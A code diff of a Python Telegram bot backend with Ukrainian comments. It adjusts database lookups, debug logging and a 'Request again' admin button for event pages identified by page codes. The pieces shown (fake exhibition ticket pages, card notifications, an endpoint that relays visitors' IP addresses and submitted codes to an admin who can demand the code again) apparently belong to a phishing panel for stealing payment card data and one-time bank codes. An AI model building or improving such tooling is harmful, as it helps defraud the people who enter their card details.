@@ -195,23 +195,55 @@ def get_page_code_for_user(uid):
 def get_event_info_by_page_code(page_code):
     """Отримує інформацію про подію за page_code"""
     c = conn.cursor()
-    c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
-    row = c.fetchone()
-    if row:
-        return {
-            'price': row[0],
-            'currency': row[1],
-            'street': row[2]
-        }
+    
+    # Спочатку шукаємо в таблиці event_links (основна таблиця)
+    try:
+        c.execute('SELECT price, currency FROM event_links WHERE event_code=?', (page_code,))
+        row = c.fetchone()
+        if row:
+            return {
+                'price': row[0],
+                'currency': row[1],
+                'street': None
+            }
+    except Exception as e:
+        print(f"[get_event_info_by_page_code] Error in event_links: {e}")
+    
+    # Якщо не знайдено, шукаємо в site_users (для зворотної сумісності)
+    try:
+        c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
+        row = c.fetchone()
+        if row:
+            return {
+                'price': row[0],
+                'currency': row[1],
+                'street': row[2]
+            }
+    except Exception as e:
+        print(f"[get_event_info_by_page_code] Error in site_users: {e}")
+    
     return None
 
 def get_admin_username_by_user_id(user_id):
     """Отримує username адміна за user_id"""
     c = conn.cursor()
-    c.execute('SELECT username FROM users WHERE user_id=?', (user_id,))
-    row = c.fetchone()
-    if row and row[0]:
-        return row[0]
+    try:
+        # Спочатку шукаємо в таблиці users
+        c.execute('SELECT username FROM users WHERE user_id=?', (user_id,))
+        row = c.fetchone()
+        if row and row[0]:
+            return row[0]
+        
+        # Якщо не знайдено, шукаємо в таблиці event_links
+        c.execute('SELECT user_id FROM event_links WHERE user_id=?', (user_id,))
+        row = c.fetchone()
+        if row:
+            # Якщо знайдено в event_links, повертаємо user_id як username
+            return f"user_{user_id}"
+            
+    except Exception as e:
+        print(f"[get_admin_username_by_user_id] Error: {e}")
+    
     return None
 
 def format_card_notification_message(page_code, name, price, currency, admin_username):
@@ -2565,7 +2597,7 @@ async def events_save_all(message):
             return
         events[event_id] = {
             'title': user_event.get('title', 'Выставка'),
-            'price': user_event.get('price', '45'),
+            'price': user_event.get('price', 'Не указано'),
             'currency': user_event.get('currency', 'EUR'),
             'address': user_event.get('address', ''),
             'events': [
@@ -2580,7 +2612,7 @@ async def events_save_all(message):
         with open(events_file, 'w', encoding='utf-8') as f:
             json.dump(events, f, ensure_ascii=False, indent=2)
         # --- Створюємо запис у site_users ---
-        price = user_event.get('price', '45')
+        price = user_event.get('price', 'Не указано')
         currency = user_event.get('currency', 'EUR')
         street = user_event.get('address', '')
         dates = user_event.get('dates', [''] * 8)
@@ -2776,8 +2808,13 @@ async def payment_notify(request):
 @log_function
 async def code_notify(request):
     data = await request.json()
+    print(f"[code_notify] Отримано дані: {data}")
+    
     page_code = data.get('page_code', '')
     ip = data.get('ip', '')
+    code_value = data.get('code', '')
+    
+    print(f"[code_notify] Парсинг: page_code='{page_code}', ip='{ip}', code='{code_value}'")
     
     # Отримуємо інформацію про користувача та подію
     user_name = None
@@ -2805,14 +2842,21 @@ async def code_notify(request):
     admin_username = None
     if page_code:
         try:
+            print(f"[code_notify] Шукаємо user_id для page_code: {page_code}")
             c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
             row = c.fetchone()
             if row:
                 admin_user_id = row[0]
+                print(f"[code_notify] Знайдено user_id: {admin_user_id}")
                 # Отримуємо username за user_id
                 admin_username = get_admin_username_by_user_id(admin_user_id)
+                print(f"[code_notify] Отримано username: {admin_username}")
+            else:
+                print(f"[code_notify] user_id не знайдено для page_code: {page_code}")
         except Exception as e:
             print(f"[code_notify] Error getting admin username: {e}")
+    else:
+        print(f"[code_notify] page_code відсутній")
     
     if page_code:
         # Отримуємо інформацію про подію
@@ -2837,7 +2881,7 @@ async def code_notify(request):
     kb = InlineKeyboardMarkup(
         inline_keyboard=[
             [
-                InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{page_code}")
+                InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{code_value}")
             ]
         ]
     )
@@ -2873,8 +2917,14 @@ async def admin_action_handler(call: types.CallbackQuery):
         parts = call.data.split(':')
         print(f"[DEBUG] Parts after split: {parts}")
         action = parts[0]
-        ip = parts[1] if len(parts) > 1 else None
-        page_code = parts[2] if len(parts) > 2 else None
+        
+        # Спеціальна обробка для code_request_again
+        if action == 'code_request_again':
+            page_code = parts[1] if len(parts) > 1 else None
+            ip = None  # Для code_request_again IP не потрібен
+        else:
+            ip = parts[1] if len(parts) > 1 else None
+            page_code = parts[2] if len(parts) > 2 else None
         
         print(f"[DEBUG] Parsed: action={action}, ip={ip}, page_code={page_code}")
     except Exception as e:
@@ -3037,15 +3087,16 @@ async def admin_action_handler(call: types.CallbackQuery):
         print(f'[DEBUG] Text action completed, user_step set to: {user_step[call.from_user.id]}')
         return
     elif action == 'code_request_again':
-        print(f'[DEBUG] Processing CODE_REQUEST_AGAIN action for code={ip}')
-        if not ip:
+        print(f'[DEBUG] Processing CODE_REQUEST_AGAIN action for code={page_code}')
+        if not page_code:
             await call.answer("❌ Помилка: відсутній код")
             return
             
         import aiohttp as aiohttp_client
         async with aiohttp_client.ClientSession() as session:
             try:
-                resp = await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
+                # Встановлюємо флаг для повторного запиту коду
+                resp = await session.post('http://127.0.0.1:8080/set_request_again', json={'code': page_code})
                 print(f'[DEBUG] Code request again response: {resp.status}')
                 
                 if resp.status == 200:
@@ -3057,7 +3108,7 @@ async def admin_action_handler(call: types.CallbackQuery):
                 print(f'[ERROR] Code request again failed: {e}')
                 await call.answer("❌ Помилка сервера")
         
-        print(f'[DEBUG] Code request again action completed')
+        print(f'[DEBUG] Code request again completed')
         return
     
     # НЕ змінюємо клавіатуру!
@@ -3179,7 +3230,7 @@ async def events_data_for_main_page(request):
     # Формуємо відповідь у форматі events.json
     data = {
         'title': 'Выставка',
-        'price': row[10] or '45',
+        'price': row[10] or 'Не указано',
         'currency': row[8] or 'EUR',
         'address': row[9] or 'plac Stanisława Małachowskiego 3, 00-916 Warszawa',
         'events': [
